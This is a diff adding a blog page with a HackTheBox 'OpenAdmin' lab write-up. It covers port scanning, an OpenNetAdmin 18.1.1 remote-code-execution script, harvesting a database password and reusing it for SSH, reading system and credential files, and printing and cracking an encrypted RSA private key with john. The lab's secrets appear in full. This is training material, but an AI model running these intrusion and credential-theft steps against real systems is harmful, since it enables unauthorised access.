@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="M1nzhi">
+
+
+
+
+
+<title>HackTheBox OpenAdmin Writeup | Hexo</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">M1nzhi&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Category</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">M1nzhi&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Category</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">HackTheBox OpenAdmin Writeup</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">M1nzhi</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">April 5, 2020&nbsp;&nbsp;22:59:25</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/category/Hackthebox/">Hackthebox</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>port scanning always is primarily things</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE    SERVICE</span><br><span class="line">22/tcp    open     ssh</span><br><span class="line">80/tcp    open     http</span><br><span class="line">1301/tcp  filtered ci3-software-1</span><br><span class="line">3283/tcp  filtered netassistant</span><br><span class="line">9877/tcp  filtered unknown</span><br><span class="line">38292/tcp filtered landesk-cba</span><br></pre></td></tr></table></figure>
+
+<p>I have 2 things to do</p>
+<ul>
+<li>SSH Brute</li>
+<li>dirscan web</li>
+</ul>
+<h3 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h3><p>No useful information found through SSH, but found a dircatory maybe useful</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.171</span><br><span class="line">/music  -&gt;  http://10.10.10.171/music/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/05/HackTheBox-OpenAdmin-Writeup/1.png" alt></p>
+<p>Login -&gt; <a href="http://10.10.10.171/ona" target="_blank" rel="noopener">http://10.10.10.171/ona</a></p>
+<p><img src="/2020/04/05/HackTheBox-OpenAdmin-Writeup/2.png" alt></p>
+<p>There are some information I got</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">title: opennetadmin</span><br><span class="line">version: v18.1.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="got-www-data-shell-through-searchsploit"><a href="#got-www-data-shell-through-searchsploit" class="headerlink" title="got www-data  shell through searchsploit"></a>got www-data  shell through searchsploit</h3><p>searchsploit always useful</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/htb/machines/openadmin$ searchsploit opennetadmin</span><br><span class="line">OpenNetAdmin 13.03.01 - Remote Code Execution                                             		 | exploits/php/webapps/26682.txt</span><br><span class="line">OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                             		| exploits/php/webapps/47772.rb</span><br><span class="line">OpenNetAdmin 18.1.1 - Remote Code Execution                                               		 | exploits/php/webapps/47691.sh</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
+
+<p>I tried 3 times in MSF, But All failed.  I have no idea about that.</p>
+<p>After google search, I just know Vulnerability file is  :  /ona/login.php</p>
+<p>use exploits/php/webapps/47691.sh</p>
+<p>./opennetadmin.sh <a href="http://10.10.10.171/ona/login.php" target="_blank" rel="noopener">http://10.10.10.171/ona/login.php</a></p>
+<p><img src="/2020/04/05/HackTheBox-OpenAdmin-Writeup/3.png" alt></p>
+<p>now, i got www-data</p>
+<h3 id="information-collection"><a href="#information-collection" class="headerlink" title="information collection"></a>information collection</h3><p>cat /etc/passwd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/<span class="literal">false</span></span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash</span><br><span class="line">mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">joanna:x:1001:1001:,,,:/home/joanna:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>I’v noticed 2 user : jimmy and joanna</p>
+<p>let’s to find something</p>
+<p>$ ls config</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth_ldap.config.php</span><br><span class="line">config.inc.php</span><br></pre></td></tr></table></figure>
+
+<p>$cat config/config.inc.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; Include the basic database functions</span><br><span class="line">require_once($conf[&#39;inc_functions_db&#39;]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Include the localized Database settings</span><br><span class="line">$dbconffile &#x3D; &quot;&#123;$base&#125;&#x2F;local&#x2F;config&#x2F;database_settings.inc.php&quot;;</span><br><span class="line">if (file_exists($dbconffile)) &#123;</span><br><span class="line">    if (substr(exec(&quot;php -l $dbconffile&quot;), 0, 28) &#x3D;&#x3D; &quot;No syntax errors detected in&quot;) &#123;</span><br><span class="line">        @include($dbconffile);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Syntax error in your DB config file: &#123;$dbconffile&#125;&lt;br&gt;Please check that it contains a valid PHP formatted array, or check that you have the php cli tools installed.&lt;br&gt;You can perform this check maually using the command &#39;php -l &#123;$dbconffile&#125;&#39;.&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    require_once($base.&#39;&#x2F;..&#x2F;install&#x2F;install.php&#39;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>got really important file : local/config/database_settings.inc.php</p>
+<p>$ cat local/config/database_settings.inc.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$ona_contexts&#x3D;array (</span><br><span class="line">  &#39;DEFAULT&#39; &#x3D;&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#39;databases&#39; &#x3D;&gt; </span><br><span class="line">    array (</span><br><span class="line">      0 &#x3D;&gt; </span><br><span class="line">      array (</span><br><span class="line">        &#39;db_type&#39; &#x3D;&gt; &#39;mysqli&#39;,</span><br><span class="line">        &#39;db_host&#39; &#x3D;&gt; &#39;localhost&#39;,</span><br><span class="line">        &#39;db_login&#39; &#x3D;&gt; &#39;ona_sys&#39;,</span><br><span class="line">        &#39;db_passwd&#39; &#x3D;&gt; &#39;n1nj4W4rri0R!&#39;,</span><br><span class="line">        &#39;db_database&#39; &#x3D;&gt; &#39;ona_default&#39;,</span><br><span class="line">        &#39;db_debug&#39; &#x3D;&gt; false,</span><br><span class="line">      ),</span><br><span class="line">    ),</span><br><span class="line">    &#39;description&#39; &#x3D;&gt; &#39;Default data context&#39;,</span><br><span class="line">    &#39;context_color&#39; &#x3D;&gt; &#39;#D3DBFF&#39;,</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>I’m tring to brute SSH using hydra</p>
+<p>users.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">joanna</span><br><span class="line">jimmy</span><br></pre></td></tr></table></figure>
+
+<p>pass.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1nj4W4rri0R!</span><br></pre></td></tr></table></figure>
+
+<p>bingo~</p>
+<p><img src="/2020/04/05/HackTheBox-OpenAdmin-Writeup/4.png" alt></p>
+<p>$ ls -la /var/www    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x  4 root     root     4096 Nov 22 18:15 .</span><br><span class="line">drwxr-xr-x 14 root     root     4096 Nov 21 14:08 ..</span><br><span class="line">drwxr-xr-x  6 www-data www-data 4096 Nov 22 15:59 html</span><br><span class="line">drwxrwx---  2 jimmy    internal 4096 Nov 23 17:43 internal</span><br><span class="line">lrwxrwxrwx  1 www-data www-data   12 Nov 21 16:07 ona -&gt; &#x2F;opt&#x2F;ona&#x2F;www</span><br></pre></td></tr></table></figure>
+
+<p>ls -la /var/www/internal</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:&#x2F;home$ ls -la &#x2F;var&#x2F;www&#x2F;internal</span><br><span class="line">total 20</span><br><span class="line">drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 .</span><br><span class="line">drwxr-xr-x 4 root  root     4096 Nov 22 18:15 ..</span><br><span class="line">-rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php</span><br><span class="line">-rwxrwxr-x 1 jimmy internal  185 Nov 23 16:37 logout.php</span><br><span class="line">-rwxrwxr-x 1 jimmy internal  339 Nov 23 17:40 main.php</span><br></pre></td></tr></table></figure>
+
+<p> cat /var/www/internal/main.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">'username'</span>])) &#123; header(<span class="string">"Location: /index.php"</span>); &#125;; </span><br><span class="line"><span class="comment"># Open Admin Trusted</span></span><br><span class="line"><span class="comment"># OpenAdmin</span></span><br><span class="line">$output = shell_exec(<span class="string">'cat /home/joanna/.ssh/id_rsa'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;pre&gt;$output&lt;/pre&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don<span class="string">'t forget your "ninja" password&lt;/h3&gt;</span></span><br><span class="line"><span class="string">Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;Session</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>what is internal?  Maybe only can internal access</p>
+<p>cat /etc/apache2/sites-enabled/internal.conf</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Listen 127.0.0.1:52846</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost 127.0.0.1:52846&gt;</span><br><span class="line">    ServerName internal.openadmin.htb</span><br><span class="line">    DocumentRoot /var/www/internal</span><br><span class="line"></span><br><span class="line">&lt;IfModule mpm_itk_module&gt;</span><br><span class="line">AssignUserID joanna joanna</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">    ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line">    CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<p>curl  -vv 127.0.0.1:52846/main.php</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE</span><br><span class="line">6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ</span><br><span class="line">ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du</span><br><span class="line">y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI</span><br><span class="line">9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4</span><br><span class="line">piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/</span><br><span class="line">/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH</span><br><span class="line">40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ</span><br><span class="line">fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb</span><br><span class="line">9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80</span><br><span class="line">X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg</span><br><span class="line">S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F</span><br><span class="line">FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh</span><br><span class="line">Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa</span><br><span class="line">RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z</span><br><span class="line">uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr</span><br><span class="line">1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2</span><br><span class="line">XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79</span><br><span class="line">yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM</span><br><span class="line">+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt</span><br><span class="line">qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Don't forget your "ninja" password<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">Click here to logout <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"logout.php"</span> <span class="attr">tite</span> = <span class="string">"Logout"</span>&gt;</span>Session</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>ssh -i joanna.pem <a href="mailto:joanna@10.10.10.171">joanna@10.10.10.171</a></p>
+<p><img src="/2020/04/05/HackTheBox-OpenAdmin-Writeup/5.png" alt></p>
+<p>what fuck!!</p>
+<h3 id="got-joanna"><a href="#got-joanna" class="headerlink" title="got joanna"></a>got joanna</h3><ol>
+<li><a href="https://github.com/koboi137/john" target="_blank" rel="noopener">ssh2john.py</a>  joanna.rsa&gt;joanna.hash</li>
+<li>john –wordlist=rockyou.txt joanna.hash</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joanna.pem:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b61df25e68a5235991f8bac883f40b539c829550ea5937c69dfd2b4c589f8c910e4c9c030982541e51b4717013fafbe1e1db9d6331c83cca061cc7550c0f4dd98da46ec1c7f460e4a135b6f1f04bafaf66a08db17ecad8a60f25a1a095d4f94a530f9f0bf9222c6736a5f54f1ff93c6182af4ad8a407044eb16ae6cd2a10c92acffa6095441ed63215b6126ed62de25b2803233cc3ea533d56b72d15a71b291547983bf5bee5b0966710f2b4edf264f0909d6f4c0f9cb372f4bb323715d17d5ded5f83117233976199c6d86bfc28421e217ccd883e7f0eecbc6f227fdc8dff12ca87a61207803dd47ef1f2f6769773f9cb52ea7bb34f96019e00531fcc267255da737ca3af49c88f73ed5f44e2afda28287fc6926660b8fb0267557780e53b407255dcb44899115c568089254d40963c8511f3492efe938a620bde879c953e67cfb55dbbf347ddd677792544c3bb11eb0843928a34d53c3e94fed25bff744544a69bc80c4ffc87ffd4d5c3ef5fd01c8b4114cacde7681ea9556f22fc863d07a0f1e96e099e749416cca147add636eb24f5082f9224e2907e3464d71ae711cf8a3f21bd4476bf98c633ff1bbebffb42d24544298c918a7b14c501d2c43534b8428d34d500537f0197e75a4279bbe4e8d2acee3c1586a59b28671e406c0e178b4d29aaa7a478b0258bde6628a3de723520a66fb0b31f1ea5bf45b693f868d47c2d89692920e2898ccd89710c42227d31293d9dad740791453ec8ebfb26047ccca53e0a200e9112f345f5559f8ded2f193feedd8c1db6bd0fbfa5441aa773dd5c4a60defe92e1b7d79182af16472872ab3c222bdd2b5f941604b7de582b08ce3f6635d83f66e9b84e6fe9d3eafa166f9e62a4cdc993d42ed8c0ad5713205a9fc7e5bc87b2feeaffe05167a27b04975e9366fa254adf511ffd7d07bc1f5075d70b2a7db06f2224692566fb5e8890c6e39038787873f21c52ce14e1e70e60b8fca716feb5d0727ac1c355cf633226c993ca2f16b95c59b3cc31ac7f641335d80ff1ad3e672f88609ec5a4532986e0567e169094189dcc82d11d46bf73bc6c48a05f84982aa222b4c0e78b18cceb15345116e74f5fbc55d407ed9ba12559f57f37512998565a54fe77ea2a2224abbddea75a1b6da09ae3ac043b6161809b630174603f33195827d14d0ebd64c6e48e0d0346b469d664f89e2ef0e4c28b6a64acdd3a0edf8a61915a246feb25e8e69b3710916e494d5f482bf6ab65c675f73c39b2c2eecdca6709188c6f36b6331953e3f93e27c987a3743eaa71502c43a807d8f91cdc4dc33f48b852efdc8fcc2647f2e588ae368d69998348f0bfcfe6d65892aebb86351825c2aa45afc2e6869987849d70cec46ba951c864accfb8476d5643e7926942ddd8f0f32c296662ba659e999b0fb0bbfde7ba2834e5ec931d576e4333d6b5e8960e9de46d32daa5360ce3d0d6b864d3324401c4975485f1aef6ba618edb12d679b0e861fe5549249962d08d25dc2dde517b23cf9a76dcf482530c9a34762f97361dd95352de4c82263cfaa90796c2fa33dd5ce1d889a045d587ef18a5b940a2880e1c706541e2b523572a8836d513f6e688444af86e2ba9ad2ded540deadd9559eb56ac66fe021c3f88c2a1a484d62d602903793d10d</span><br></pre></td></tr></table></figure>
+
+<p>john –wordlist=rockyou.txt joanna.hash</p>
+<p><img src="/2020/04/05/HackTheBox-OpenAdmin-Writeup/6.png" alt></p>
+<p>I’m tring to connect target using joanna_rsa and ssh password what was cracked before by john.</p>
+<p>I got some infor here:  permissions 0644 for ‘joanna.pem’ are top open</p>
+<p><img src="/2020/04/05/HackTheBox-OpenAdmin-Writeup/7.jpg" alt></p>
+<p>so, i reduce the privilege, and try it again</p>
+<p><img src="/2020/04/05/HackTheBox-OpenAdmin-Writeup/8.png" alt></p>
+<p>Okay, I got  joanna.</p>
